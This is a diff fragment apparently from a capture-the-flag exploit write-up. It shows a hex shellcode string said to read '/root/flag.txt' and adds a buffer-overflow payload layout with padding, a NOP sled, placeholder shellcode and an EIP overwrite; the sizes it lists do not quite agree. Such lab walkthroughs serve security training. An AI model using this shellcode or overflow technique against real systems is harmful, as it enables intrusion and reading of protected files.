@@ -136,9 +136,16 @@ Now that it works, update "shellcodePwn.py" to read "/root/flag.txt":
     48b801010101010101015048b860662f75797501014831042448b82f726f6f742f666c506a02584889e731f60f0541baffffff7f4889c66a28586a015f990f05
 
 
+Now that we've got a shellcode, lets craft a payload. Our requirements are:
 
+- 2060 bytes + pointer to shellcode.
+- 64 bytes for shellcode.
+- Lets add 100 bytes of no operation instruction (NOPS)
 
-
+         Buffer = "\x41" * (2060 - 100 - 64) = 1896
+           NOPs = "\x90" * 100
+      Shellcode = "\x44" * 150
+            EIP = "\x66" * 4
 
 
 
